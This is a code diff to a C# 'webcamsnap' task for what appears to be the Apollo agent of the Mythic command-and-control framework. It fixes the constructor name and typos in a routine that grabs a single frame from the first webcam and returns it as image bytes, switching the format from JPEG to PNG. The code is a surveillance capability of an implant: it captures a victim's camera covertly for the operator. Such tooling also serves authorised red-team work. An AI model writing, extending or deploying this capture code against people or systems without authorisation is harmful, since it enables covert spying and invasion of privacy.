@@ -24,7 +24,7 @@ namespace Tasks
 {
     public class webcamsnap : Tasking
     {
-        public screenshot(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public webcamsnap(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
@@ -41,14 +41,14 @@ namespace Tasks
                     return;
                 }
 
-                var tcs = new TaskCompletitionSource<byte[]>();
-                var videoSource = new VideoCaptureDevice(videoDevices[0].MonkerString);
+                var tcs = new TaskCompletionSource<byte[]>();
+                var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
 
                 videoSource.NewFrame += (sender, eventArgs) =>
                 {
                     using Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
                     using MemoryStream ms = new();
-                    bitmap.Save(ms, ImageFormat.Jpeg);
+                    bitmap.Save(ms, ImageFormat.Png);
                     tcs.TrySetResult(ms.ToArray());
                     videoSource.SignalToStop();
                 };
